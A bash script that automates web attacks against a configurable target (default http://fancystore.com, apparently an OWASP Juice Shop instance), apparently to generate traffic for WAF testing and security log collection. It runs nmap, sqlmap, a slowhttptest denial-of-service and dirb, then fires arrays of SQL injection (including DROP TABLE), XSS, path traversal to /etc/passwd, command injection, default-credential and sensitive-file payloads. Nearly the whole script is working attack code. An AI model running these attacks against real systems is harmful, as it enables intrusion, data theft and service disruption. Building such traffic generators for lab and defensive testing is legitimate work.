#!/bin/bash
set -e

# Redirect all output to log file
exec > >(tee /log/attack.log) 2>&1

# Function to execute attacks from attack file
execute_attacks_from_file() {
    local attack_file="$1"
    local start_line="$2"
    local end_line="$3"
    local target="$4"
    
    echo "[START] Executing attacks from file at $(date)"
    echo "[*] Attack file: $attack_file"
    
    if [[ ! -f "$attack_file" ]]; then
        echo "[ERROR] Attack file not found: $attack_file"
        return 1
    fi
    
    # Count total lines in attack file
    local total_lines=$(wc -l < "$attack_file")
    echo "[*] Total lines in attack file: $total_lines"
    
    # Determine line range
    local actual_start=1
    local actual_end="$total_lines"
    
    if [[ -n "$start_line" && -n "$end_line" ]]; then
        actual_start="$start_line"
        actual_end="$end_line"
        echo "[*] Executing lines $actual_start to $actual_end"
    else
        echo "[*] Executing all lines (1 to $actual_end)"
    fi
    
    # Execute attacks from file
    local line_num=0
    local executed_count=0
    
    while IFS='|' read -r attack_type method path data expected waf_mode description; do
        line_num=$((line_num + 1))
        
        # Skip lines outside the specified range
        if [[ $line_num -lt $actual_start || $line_num -gt $actual_end ]]; then
            continue
        fi
        
        # Skip comment lines and empty lines
        if [[ "$attack_type" =~ ^#.*$ || -z "$attack_type" ]]; then
            continue
        fi
        
        echo "[*] Line $line_num: $attack_type - $description"
        echo "[*] Method: $method, Path: $path"
        
        # Execute the attack based on type
        case "$attack_type" in
            "sql_injection"|"auth_bypass"|"cmd_injection")
                # POST request with JSON data
                if [[ -n "$data" ]]; then
                    response=$(curl -s -w "%{http_code}" \
                        -X "$method" \
                        -H "User-Agent: attacker" \
                        -H "Content-Type: application/json" \
                        -d "$data" \
                        "$target$path")
                else
                    response=$(curl -s -w "%{http_code}" \
                        -X "$method" \
                        -H "User-Agent: attacker" \
                        "$target$path")
                fi
                ;;
            "xss"|"traversal"|"file_discovery"|"method_enum"|"benign")
                # GET request or other methods
                if [[ -n "$data" ]]; then
                    response=$(curl -s -w "%{http_code}" \
                        -X "$method" \
                        -H "User-Agent: attacker" \
                        "$target$path?$data")
                else
                    response=$(curl -s -w "%{http_code}" \
                        -X "$method" \
                        -H "User-Agent: attacker" \
                        "$target$path")
                fi
                ;;
            *)
                echo "[WARNING] Unknown attack type: $attack_type"
                continue
                ;;
        esac
        
        http_code=$(echo "$response" | tail -c 4)
        echo "  Result: HTTP $http_code (Expected: $expected, WAF: $waf_mode)"
        
        # Check if attack was blocked by WAF
        if [[ "$waf_mode" == "block" && "$http_code" == "403" ]]; then
            echo "  [WAF_BLOCKED] Attack was blocked by WAF as expected"
        elif [[ "$waf_mode" == "bypass" && "$http_code" == "200" ]]; then
            echo "  [WAF_BYPASSED] Attack bypassed WAF as expected"
        else
            echo "  [UNEXPECTED] Unexpected response for WAF mode $waf_mode"
        fi
        
        executed_count=$((executed_count + 1))
        
        # Small delay between attacks
        sleep 1
        
    done < "$attack_file"
    
    echo "[DONE] Executed $executed_count attacks from file at $(date)"
    echo "[*] Attack file execution completed"
}

# Parse command line arguments
TARGET="http://fancystore.com"  # Default target
START_LINE=""
END_LINE=""
ATTACK_FILE="/opt/scripts/attacks.txt"

while [ $# -gt 0 ]; do
  case $1 in
    --target)
      TARGET="$2"
      shift 2
      ;;
    --start)
      START_LINE="$2"
      shift 2
      ;;
    --end)
      END_LINE="$2"
      shift 2
      ;;
    --attack-file)
      ATTACK_FILE="$2"
      shift 2
      ;;
    --help)
      echo "Usage: $0 [OPTIONS]"
      echo ""
      echo "Options:"
      echo "  --target URL        Target URL (default: http://fancystore.com)"
      echo "  --start LINE        Start line number for attack execution"
      echo "  --end LINE          End line number for attack execution"
      echo "  --attack-file FILE  Attack scenarios file (default: /opt/scripts/attacks.txt)"
      echo "  --help              Show this help"
      echo ""
      echo "Examples:"
      echo "  $0 --target http://fancystore.com"
      echo "  $0 --start 3 --end 6"
      echo "  $0 --start 10 --end 15 --attack-file /opt/scripts/attacks.txt"
      exit 0
      ;;
    *)
      echo "Unknown option $1"
      echo "Use --help for usage information"
      exit 1
      ;;
  esac
done

echo "[*] Attacking target: $TARGET"
echo "[*] Attack file: $ATTACK_FILE"
if [[ -n "$START_LINE" && -n "$END_LINE" ]]; then
    echo "[*] Executing attacks from line $START_LINE to $END_LINE"
else
    echo "[*] Executing all attacks (no line range specified)"
fi
echo "Setting up environment variables..."

# Extract hostname and port from target URL
TARGET_HOST=$(echo $TARGET | sed 's|http://||' | sed 's|https://||' | cut -d':' -f1)
TARGET_PORT=$(echo $TARGET | sed 's|http://||' | sed 's|https://||' | cut -d':' -f2)
if [ -z "$TARGET_PORT" ] || [ "$TARGET_PORT" = "$TARGET_HOST" ]; then
    TARGET_PORT="80"
fi

# Set environment variables for the attack script
export TARGET_HOST="$TARGET_HOST"
export TARGET_PORT="$TARGET_PORT"
export ATTACK_TYPE="sql_injection"
export ATTACK_PHASE="automated"
export VARIANT_ID="lowscan_moderate"

echo "Environment variables set:"
echo "  TARGET_HOST: $TARGET_HOST"
echo "  TARGET_PORT: $TARGET_PORT"
echo "  ATTACK_TYPE: $ATTACK_TYPE"
echo "  ATTACK_PHASE: $ATTACK_PHASE"
echo "  VARIANT_ID: $VARIANT_ID"

echo "Starting Day 2 Enhanced Attack Script..."
echo "Sleeping for 30 seconds before starting the attack..."
sleep 30

# ========================================
# DAY 2: REAL ATTACK SCRIPTS
# ========================================

echo "[*] ========================================"
echo "[*] DAY 2: REAL ATTACK SCRIPTS"
echo "[*] ========================================"

# Execute attacks from attack file if specified
if [[ -f "$ATTACK_FILE" ]]; then
    echo "[*] Executing attacks from attack file..."
    execute_attacks_from_file "$ATTACK_FILE" "$START_LINE" "$END_LINE" "$TARGET"
    echo "[*] Attack file execution completed"
else
    echo "[*] No attack file found, continuing with built-in attacks..."
fi

# 1. nmap Web 端口扫描
echo "[START] nmap Web port scan at $(date)"
echo "[*] 1. Running nmap Web port scan..."
echo "[*] Command: nmap -sV -p- --script=http-title $TARGET"
nmap -sV -p- --script=http-title $TARGET > /tmp/nmap_scan.txt 2>&1
echo "[DONE] nmap Web port scan at $(date)"
echo "[+] Nmap scan completed, results saved to /tmp/nmap_scan.txt"
cat /tmp/nmap_scan.txt

# 2. sqlmap注入测试（针对Juice Shop的REST API）
echo "[START] sqlmap SQL injection test at $(date)"
echo "[*] 2. Running sqlmap SQL injection test..."
echo "[*] Command: sqlmap -u \"$TARGET/rest/user/login\" --data='{\"email\":\"admin@juice-sh.op\",\"password\":\"123456\"}' --method=POST --batch --level=3 --risk=2 --threads=2 --random-agent --user-agent=\"attacker\""
sqlmap -u "$TARGET/rest/user/login" \
       --data='{"email":"admin@juice-sh.op","password":"123456"}' \
       --method=POST \
       --batch \
       --level=3 \
       --risk=2 \
       --threads=2 \
       --random-agent \
       --user-agent="attacker" \
       --output-dir=/tmp/sqlmap_results
echo "[DONE] sqlmap SQL injection test at $(date)"

# 3. Slow HTTP 攻击（slowhttptest）
echo "[START] slowhttptest DoS attack at $(date)"
echo "[*] 3. Running slowhttptest DoS attack..."
echo "[*] Command: slowhttptest -c 50 -H -i 10 -r 200 -t GET -u \"$TARGET\" -x 24 -p 3"
slowhttptest -c 50 -H -i 10 -r 200 -t GET -u "$TARGET" -x 24 -p 3 &
SLOWHTTP_PID=$!

# Wait for slowhttptest to run for 30 seconds
echo "[*] Slowhttptest running for 30 seconds..."
sleep 30

# Stop slowhttptest
echo "[*] Stopping slowhttptest..."
kill $SLOWHTTP_PID 2>/dev/null || true
echo "[DONE] slowhttptest DoS attack at $(date)"

# 4. Additional Web enumeration with dirb
echo "[START] dirb directory enumeration at $(date)"
echo "[*] 4. Running dirb directory enumeration..."
echo "[*] Command: dirb $TARGET /usr/share/dirb/wordlists/common.txt -S -r -w"
dirb $TARGET /usr/share/dirb/wordlists/common.txt -S -r -w > /tmp/dirb_results.txt 2>&1
echo "[DONE] dirb directory enumeration at $(date)"
echo "[+] Dirb scan completed, results saved to /tmp/dirb_results.txt"

# 5. Advanced Web Application Attacks
echo "[START] advanced web application attacks at $(date)"
echo "[*] 5. Running advanced web application attacks..."
echo "[*] Executing real attack payloads and exploit attempts"

# Create attack results directory
mkdir -p /tmp/attack_results

# 5.1 SQL Injection Attacks
echo "[START] SQL Injection Attacks at $(date)"
echo "[*] 5.1 SQL Injection Attacks..."
echo "[*] Testing various SQL injection techniques"

# SQL Injection payloads
SQL_PAYLOADS=(
    "admin' OR '1'='1"
    "admin' --"
    "' OR 1=1--"
    "' UNION SELECT 1,2,3--"
    "admin'/*"
    "' OR 'x'='x"
    "'; DROP TABLE users--"
    "' AND (SELECT COUNT(*) FROM users)>0--"
    "' AND (SELECT SLEEP(3))--"
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--"
)

# Test SQL injection on login endpoint
for payload in "${SQL_PAYLOADS[@]}"; do
    echo "[*] Testing SQL injection: $payload"
    response=$(curl -s -w "%{http_code}|%{time_total}" \
        -H "User-Agent: attacker" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$payload\",\"password\":\"test\"}" \
        "$TARGET/rest/user/login")
    
    http_code=$(echo $response | cut -d'|' -f1)
    response_time=$(echo $response | cut -d'|' -f2)
    
    echo "  Payload: $payload -> HTTP: $http_code, Time: ${response_time}s"
    
    # Check for SQL error indicators
    if curl -s -H "User-Agent: attacker" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$payload\",\"password\":\"test\"}" \
        "$TARGET/rest/user/login" | grep -i "sql\|mysql\|error\|syntax" > /dev/null; then
        echo "  [VULNERABLE] SQL error detected!"
    fi
done

# 5.2 XSS (Cross-Site Scripting) Attacks
echo "[*] 5.2 XSS (Cross-Site Scripting) Attacks..."
echo "[*] Testing XSS payloads"

XSS_PAYLOADS=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "javascript:alert('XSS')"
    "<svg onload=alert('XSS')>"
    "'\"><script>alert('XSS')</script>"
    "<iframe src=javascript:alert('XSS')>"
)

# Test XSS on search endpoint
for payload in "${XSS_PAYLOADS[@]}"; do
    echo "[*] Testing XSS: $payload"
    response=$(curl -s -w "%{http_code}" \
        -H "User-Agent: attacker" \
        -H "Content-Type: application/json" \
        -d "{\"q\":\"$payload\"}" \
        "$TARGET/rest/products/search")
    
    echo "  Payload: $payload -> HTTP: $response"
done

# 5.3 Directory Traversal Attacks
echo "[*] 5.3 Directory Traversal Attacks..."
echo "[*] Testing path traversal techniques"

TRAVERSAL_PAYLOADS=(
    "../../../etc/passwd"
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
    "....//....//....//etc/passwd"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    "..%252f..%252f..%252fetc%252fpasswd"
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
)

# Test directory traversal
for payload in "${TRAVERSAL_PAYLOADS[@]}"; do
    echo "[*] Testing traversal: $payload"
    response=$(curl -s -w "%{http_code}" \
        -H "User-Agent: attacker" \
        "$TARGET/$payload")
    
    echo "  Payload: $payload -> HTTP: $response"
    
    # Check if we got sensitive file content
    if echo "$response" | grep -i "root:\|administrator:\|mysql:" > /dev/null; then
        echo "  [VULNERABLE] Sensitive file content detected!"
    fi
done

# 5.4 Command Injection Attacks
echo "[*] 5.4 Command Injection Attacks..."
echo "[*] Testing command injection techniques"

CMD_PAYLOADS=(
    "; ls -la"
    "| whoami"
    "&& cat /etc/passwd"
    "; ping -c 1 127.0.0.1"
    "| id"
    "&& uname -a"
)

# Test command injection on various endpoints
for payload in "${CMD_PAYLOADS[@]}"; do
    echo "[*] Testing command injection: $payload"
    
    # Test on search endpoint
    response=$(curl -s -w "%{http_code}" \
        -H "User-Agent: attacker" \
        -H "Content-Type: application/json" \
        -d "{\"q\":\"$payload\"}" \
        "$TARGET/rest/products/search")
    
    echo "  Search endpoint: $payload -> HTTP: $response"
done

# 5.5 Authentication Bypass Attacks
echo "[*] 5.5 Authentication Bypass Attacks..."
echo "[*] Testing authentication bypass techniques"

# Test common admin credentials
ADMIN_CREDS=(
    "admin:admin"
    "admin:password"
    "admin:123456"
    "root:root"
    "administrator:admin"
    "test:test"
)

for cred in "${ADMIN_CREDS[@]}"; do
    username=$(echo $cred | cut -d: -f1)
    password=$(echo $cred | cut -d: -f2)
    
    echo "[*] Testing credentials: $username:$password"
    response=$(curl -s -w "%{http_code}" \
        -H "User-Agent: attacker" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$username@test.com\",\"password\":\"$password\"}" \
        "$TARGET/rest/user/login")
    
    echo "  Credentials: $username:$password -> HTTP: $response"
done

# 5.6 Sensitive File Discovery
echo "[*] 5.6 Sensitive File Discovery..."
echo "[*] Testing for sensitive files and directories"

SENSITIVE_FILES=(
    ".env"
    "config.php"
    "wp-config.php"
    ".git/config"
    "backup.sql"
    "database.yml"
    ".htaccess"
    "robots.txt"
    "sitemap.xml"
    "admin/"
    "phpmyadmin/"
    "wp-admin/"
)

for file in "${SENSITIVE_FILES[@]}"; do
    echo "[*] Testing sensitive file: $file"
    response=$(curl -s -w "%{http_code}" \
        -H "User-Agent: attacker" \
        "$TARGET/$file")
    
    http_code=$(echo $response | tail -c 4)
    echo "  File: $file -> HTTP: $http_code"
    
    if [ "$http_code" = "200" ]; then
        echo "  [FOUND] Sensitive file accessible: $file"
    fi
done

# 5.7 HTTP Method Enumeration
echo "[*] 5.7 HTTP Method Enumeration..."
echo "[*] Testing different HTTP methods"

HTTP_METHODS=("GET" "POST" "PUT" "DELETE" "HEAD" "OPTIONS" "TRACE" "PATCH")

for method in "${HTTP_METHODS[@]}"; do
    echo "[*] Testing HTTP method: $method"
    response=$(curl -s -w "%{http_code}" \
        -X "$method" \
        -H "User-Agent: attacker" \
        "$TARGET/")
    
    echo "  Method: $method -> HTTP: $response"
done

# Save attack results
echo "[*] Saving attack results..."
echo "Attack completed at $(date)" > /tmp/attack_results/attack_summary.txt
echo "Total SQL injection tests: ${#SQL_PAYLOADS[@]}" >> /tmp/attack_results/attack_summary.txt
echo "Total XSS tests: ${#XSS_PAYLOADS[@]}" >> /tmp/attack_results/attack_summary.txt
echo "Total traversal tests: ${#TRAVERSAL_PAYLOADS[@]}" >> /tmp/attack_results/attack_summary.txt
echo "Total command injection tests: ${#CMD_PAYLOADS[@]}" >> /tmp/attack_results/attack_summary.txt
echo "Total credential tests: ${#ADMIN_CREDS[@]}" >> /tmp/attack_results/attack_summary.txt
echo "Total sensitive file tests: ${#SENSITIVE_FILES[@]}" >> /tmp/attack_results/attack_summary.txt
echo "Total HTTP method tests: ${#HTTP_METHODS[@]}" >> /tmp/attack_results/attack_summary.txt

echo "[DONE] advanced web application attacks at $(date)"
echo "[*] ========================================"
echo "[*] DAY 2 ATTACK COMPLETED"
echo "[*] ========================================"
echo "[FINAL] All attack scripts completed at $(date)"
echo "[*] Attack completed successfully!"
echo "[*] Check nginx logs for attack traffic recording"
echo "[*] Results saved to:"
echo "[*] - /tmp/nmap_scan.txt"
echo "[*] - /tmp/sqlmap_results/"
echo "[*] - /tmp/dirb_results.txt"
echo "[*] ========================================"

# Note: Original SecurityLogs attack script (container_attack.py) has been disabled
# to avoid duplicate attack traffic. Only Day 2 enhanced attacks are now active.


